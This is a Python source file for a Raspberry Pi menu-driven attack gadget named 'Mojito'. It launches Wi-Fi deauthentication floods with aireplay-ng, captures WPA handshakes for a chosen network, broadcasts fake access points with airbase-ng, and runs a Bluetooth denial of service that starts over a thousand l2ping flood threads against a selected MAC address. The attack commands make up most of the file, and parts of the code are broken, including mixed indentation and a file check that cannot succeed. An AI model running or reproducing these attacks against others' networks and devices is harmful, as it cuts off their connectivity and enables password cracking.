import RPi.GPIO as GPIO
import time
import os
import subprocess
import json
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from lib import dos_bluetooth
from lib.dos_bluetooth import dos
from lib import wifinetworks
from lib.wifinetworks import wifi_info
from lib.mojstd import *
from lib.netstd import *

scroll_offset = 0
selected_index = 0
handshakes = 1 #on
max_visible_options = 7
INTERFACE = json.load(open("settings/settings.json", "r"))["interface"]
interface = []

#@functools.lru_cache(maxsize=1000)
def bk():
    if GPIO.input(KEY3_PIN) == 0:
            return True


def draw_menu(selected_index):
    global scroll_offset
    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))

    # Determina quante opzioni sono fuori dallo schermo e gestisce lo scorrimento
    total_options = len(menu_options)

    # Controlla se bisogna scorrere in basso o in alto
    if selected_index < scroll_offset:
        scroll_offset = selected_index
    elif selected_index >= scroll_offset + max_visible_options:
        scroll_offset = selected_index - max_visible_options + 1

    # Calcola l'offset per le opzioni del menu

    for i in range(scroll_offset, min(scroll_offset + max_visible_options, total_options)):
        y = ((i - scroll_offset) * 20) # Spacing between menu items with offset
        option = menu_options[i]
        if i == selected_index:
            text_size = draw.textbbox((0, 0), option, font=font)
            text_width = text_size[2] - text_size[0]
            text_height = text_size[3] - text_size[1]
            draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0)) #Highlight background
            draw.text((1, y), option, font=font, fill=(0, 0, 0))  # Text in black
        else:
            draw.text((1, y), option, font=font, fill=(255, 255, 255))  # Text in white

    # Display the updated image
    disp.LCD_ShowImage(image, 0, 0)


selected_index = 0
b = 1
nevergonnagiveuup = ["Never Gonna Give You Up", "Never Gonna Let You Down", "Never Gonna Run Around", "And DesertYou", "Never Gonna Make You Cry", "Never Gonna Say Good Bye"]
a = nevergonnagiveuup[0]


#############################################################################################

                                        # THE WHILE#

#############################################################################################




while True:
    menu_options = ["Networks","Bluetooth", "Settings", "Reboot", "Shutdown"]
    draw_menu(selected_index)

    if GPIO.input(KEY_UP_PIN) == 0:
        selected_index = (selected_index - 1) % len(menu_options)
        draw_menu(selected_index)

    elif GPIO.input(KEY_DOWN_PIN) == 0:
        selected_index = (selected_index + 1) % len(menu_options)
        draw_menu(selected_index)

    elif GPIO.input(KEY_PRESS_PIN) == 0:

        selected_option = menu_options[selected_index]

        if selected_option == "Networks":
            # NETWORKS
            time.sleep(0.2)
            while True:
                menu_options = ["Wifi"]
                draw_menu(selected_index)

                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif bk() == True:
                    ui_print("Retring...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Wifi":
                        #WIFI

                        time.sleep(0.30)
                        selected_index = 0
                        while True:
                            menu_options = ["Fake AP", "Handshakes", "Deauth all"]

                            draw_menu(selected_index)
                            if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                selected_index = (selected_index + 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif bk() == True:
                                ui_print("Retring...", 0.5)
                                break

                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                selected_option = menu_options[selected_index]


                                #Handshakes -----------------> WORKS !!!
                                if selected_option == "Handshakes":
                                    ui_print("Loading...", 0.3)
                                    wifi_info().main()
                                    menu_options = []
                                    selected_index = 0

                                    with open("wifiinfo.json", mode="r") as a:
                                        data = json.load(a)

                                    dictdionary = {}

                                    for item in data:
                                        menu_options.append(item['ssid'])
                                        dictdionary[item['ssid']] = item['bssid']

                                    selected_index = 0
                                    while handshakes == 1:
                                            draw_menu(selected_index)

                                            if GPIO.input(KEY_UP_PIN) == 0:
                                                selected_index = (selected_index - 1) % len(menu_options)
                                                draw_menu(selected_index)

                                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                                selected_index = (selected_index + 1) % len(menu_options)
                                                draw_menu(selected_index)

                                            elif bk() == True:
                                                ui_print("Retring...", 0.5)
                                                break

                                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                selected_option = menu_options[selected_index]
                                                selected_bssid = dictdionary[selected_option]
                                                print(selected_bssid)
                                                #Bettercap

                                                ui_print("Wait please...")
                                                process = CapHandshakes(INTERFACE).interface_select(INTERFACE)
                                                if process == 0:
                                                    pass
                                                else:
                                                    print(process)
                                                    ui_print("""Error: 
Interface not Found
Try to reboot Mojito
if the problem persist""") 
                                                    break

                                                if CapHandshakes(INTERFACE).interface_start(INTERFACE) == 1:
                                                    ui_print("Retring", 0.5)
                                                    break

                                                time.sleep(1)
                                                ui_print(f"{INTERFACE} ready!")

                                                # KEY3
                                                if bk() == True:
                                                    ui_print("Retring...", 0.5)
                                                    break

                                                ui_print("Wait please...")
                                                time.sleep(1)

                                                if bk() == True:
                                                        ui_print("Retring...", 0.5)
                                                        break

                                                else:
                                                    time.sleep(0.5)
                                                    process = CapHandshakes(INTERFACE).initialization(selected_bssid, INTERFACE)
                                                    print("process is running")
                                                    
                                                    while True:
                                                    	if process == 1:
                                                    	    bk_ = 1
                                                    	    break
                                                    	    
                                                        elif process == 0:
                                                            break
                                                    	    
                                                        else:
                                                            pass
                                                    
                                                    if bk_ == 1:
                                                        selected_index = 0
                                                        break
                                                            

                                                    ui_print("this might take some time...", 2)
                                                    ui_print("""When the handshake
is captured,
you'll be notified""", 2.5)
                                                    while process == True:
                                                        if os.path.exists(f"'wpa({selected_bssid}).pcap'") == True:
                                                            ui_print("Handshake captured!",1)
                                                            os.system("sudo systemctl start NetworkManager")
                                                            ui_print("Retring...")
                                                            break

                                                        elif bk() == True:
                                                            selected_index = 0
                                                            break

                                                        else:
                                                            pass

                                #DEAUTH ALL -----> THIS MIGHT NOT WORK 
                                elif selected_option == "Deauth all":
                                    wifi_info().main()
                                    menu_options = []

                                    with open("wifiinfo.json", mode="r") as a:
                                        data = json.load(a)

                                    dictdionary = {}

                                    for item in data:
                                            menu_options.append(item['ssid'])
                                            dictdionary[item['ssid']] = item['bssid']
                                            dictdionary[item['bssid']] = item['chan']

                                    ui_print("Loading...",1 )

                                    selected_index = 0
                                    while True:
                                        draw_menu(selected_index)
                                        if GPIO.input(KEY_UP_PIN) == 0:
                                            selected_index = (selected_index - 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif GPIO.input(KEY_DOWN_PIN) == 0:
                                            selected_index = (selected_index + 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif bk() == True:
                                            ui_print("Retring...", 0.5)
                                            selected_index = 0
                                            break


                                        elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                selected_option = menu_options[selected_index]
                                                selected_bssid = dictdionary[selected_option]
                                                selected_chan = dictdionary[selected_bssid]
                                                print("info: "+selected_option+" "+selected_bssid+" "+str(selected_chan))

                                                ui_print("Deauth starting...")
                                                os.system(f"sudo airmon-ng start {INTERFACE}")
                                                time.sleep(0.5)
                                                ui_print(f"{INTERFACE} interface created", 1)
                                                time.sleep(0.5)
                                                ui_print("Wait please...", 1)
                                                time.sleep(0.5)
                                                subprocess.run(['sudo', 'iwconfig', f'{INTERFACE}', 'channel', str(selected_chan)], text=True, capture_output=True)
                                                time.sleep(1.25)
                                                ui_print(f"{INTERFACE} --> channel {str(selected_chan)}")
                                                time.sleep(1)
                                                ui_print("Loading...")
                                                time.sleep(1)
                                                ui_print("Press Key_3 to go back...")
                                                command = ['sudo', 'aireplay-ng','--deauth', '0', '-a', selected_bssid, f'{INTERFACE}']

                                                deauthall = subprocess.run(command, text=True, capture_output=True)

                                                if  GPIO.input(KEY3_PIN) == 0:
                                                    ui_print("Retring...", 0.5)
                                                    break

                                                elif deauthall.returncode != 0:
                                                    ui_print(f"Error: {deauthall.stderr}", 2)
                                                    with open("output1.txt", 'a') as file:
                                                        command_string = ' '.join(command)
                                                        file.write(f"command: {command_string}\n")
                                                        file.write(deauthall.stderr)
                                                        file.write(deauthall.stdout)
                                                        os.system(f"sudo iwconfig {INTERFACE} mode managed")
                                                        os.system("sudo systemctl NetworkManager restart")
                                                        time.sleep(1)
                                                        ui_print(f"Restarting {INTERFACE}...",2)
                                                        break

                                                else:
                                                    with open("output1.txt", 'a') as file:
                                                        command_string = ' '.join(command)
                                                        file.write(f"command: {command_string}\n")
                                                        file.write(deauthall.stdout)










                                #Fake AP
                                elif selected_option == 'Fake AP':
                                    selected_index = 0

                                    while True:
                                        menu_options = ["RickRoll", "Random"]
                                        draw_menu(selected_index)
                                        
                                        if GPIO.input(KEY_UP_PIN) == 0:
                                            selected_index = (selected_index - 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif GPIO.input(KEY_DOWN_PIN) == 0:
                                            selected_index = (selected_index + 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif bk() == True:
                                            ui_print("Retring...", 0.5)
                                            break

                                        elif GPIO.input(KEY_PRESS_PIN) == 0:
                                            selected_option = menu_options[selected_index]
                                            ui_print("Wait please...")

                                            if selected_option == "RickRoll":
                                                time.sleep(1)
                                                os.system(f"sudo airmon-ng start {INTERFACE}")
                                                os.system(f"sudo airmon-ng check {INTERFACE} && sudo airmon-ng check kill")
                                                os.system(f"sudo airmon-ng start {INTERFACE}")
                                                ui_print(f"{INTERFACE} is ready")
                                                ui_print("Starting ...")
                                                time.sleep(1)

                                            def RickRoll(a, b):
                                                os.system(f'sudo airbase-ng -e "{nevergonnagiveuup[a]}" -c {b} {INTERFACE}')

                                            for i in range(len(nevergonnagiveuup)):
                                                ui_print(f"""Fake AP - 
RickRoll started . . .""", 1.5)
                                                threading.Thread(target=RickRoll, args=(i, b)).start()
                                                b += 1
                                            while True:
                                                ui_print("Press Key 3 to stop...")
                                                if bk() == True:
                                                    ui_print("Retring...", 0.5)
                                                    threading.Event()
                                                    break

        elif selected_option == "Bluetooth":
            selected_index = 0
            time.sleep(0.20)

            while True:
                menu_options = ["Dos", "Multiple attacks"]
                draw_menu(selected_index)


                if GPIO.input(KEY_UP_PIN) == 0:
                        selected_index = (selected_index - 1) % len(menu_options)
                        draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif bk() == True:
                    ui_print("Retring...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    #Bluetooth Dos

                    if selected_option == "Dos":

                        ui_print("Wait please . . .")
                        menu_options = []
                        selected_index = 0

                        dos().main()       #Scan for mac address
                        for i in dos_bluetooth.mac_addrs:
                            menu_options.append(i)

                        time.sleep(0.25)
                        selected_index = 0
                        BLUEDOS = 1
                        while True:
                            if BLUEDOS == 0:
                                ui_print("Quitting DOS...")
                                time.sleep(2.5)

                            draw_menu(selected_index)

                            if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                selected_index = (selected_index + 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif bk() == True:
                                ui_print("Retring...", 0.5)
                                break

                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                selected_option = menu_options[selected_index]

                                #while True:
                                mac = str(selected_option)
                                print(mac)
                                os.system("sudo " + "hciconfig " + "hci0 " + "up")
                                time.sleep(1)
                                def DOS(a):
                                        os.system('sudo l2ping -i hci0 -s 600 -f '+ mac)

                                for i in range(0, 1023, 1):
                                    ui_print(f"""Dossing
    {mac} . . .""")
                                    BleDos = threading.Thread(target=DOS, args=[str(mac)]).start()

                                    #if bk() == True:
                                     #   BLUEDOS = 0
                                      #  BleDos.threading.Event()
                                       # time.slee(1)
                                        #ui_print("Retring...", 0.5)
                                        #break

        elif selected_option == "Reboot":
            menu_options = ["Yes", "No"]
            selected_index = 0

            time.sleep(0.5)
            while True:
                draw_menu(selected_index)
                if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif bk() == True:
                    ui_print("Retring...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Yes":
                        ui_print("Rebooting...", 10)
                        os.system("sudo reboot now")

                    else:
                        break

        elif selected_option == "Shutdown":
            menu_options = ["Yes", "No"]
            selected_index = 0

            time.sleep(0.20)
            while True:
                draw_menu(selected_index)
                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif  GPIO.input(KEY3_PIN) == 0:
                    ui_print("Retring...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Yes":
                        ui_print("Shutting down mojito...", 10)
                        os.system("sudo shutdown now")

                    else:
                        break

        elif selected_option == "Settings":
            selected_index = 0

            time.sleep(0.20)
            while True:
                menu_options = ["Interface", "Ssh"]
                draw_menu(selected_index)
                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY3_PIN) == 0:
                    ui_print("Retring...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Interface":
                        sys_class_net_ = subprocess.run(["ls", "/sys/class/net/"], text=True, capture_output=True)
                        if sys_class_net_.returncode != 0:
                            ui_print("""Error: Unable to find ANY 
    network interfaces""")

                        else:
                            interface = sys_class_net_.stdout.splitlines()

                            #interface menu
                            selected_index = 0
                            time.sleep(0.20)

                            while True:
                                menu_options = interface
                                draw_menu(selected_index)
                                if GPIO.input(KEY_UP_PIN) == 0:
                                    selected_index = (selected_index - 1) % len(menu_options)
                                    draw_menu(selected_index)

                                elif GPIO.input(KEY_DOWN_PIN) == 0:
                                    selected_index = (selected_index + 1) % len(menu_options)
                                    draw_menu(selected_index)

                                elif GPIO.input(KEY3_PIN) == 0:
                                    ui_print("Retring...", 0.5)
                                    break

                                elif GPIO.input(KEY_PRESS_PIN) == 0:
                                    selected_option = menu_options[selected_index]
                                    INTERFACE = {"interface":selected_option}
                                    ui_print("Wait please...", 0.5)
                                    with open("settings/settings.json", "w") as idk:
                                        json.dump(INTERFACE, idk, indent=2)
                                    ui_print(f"""Selected Interface:
{selected_option}""")

                                
                                




                    else:
                        break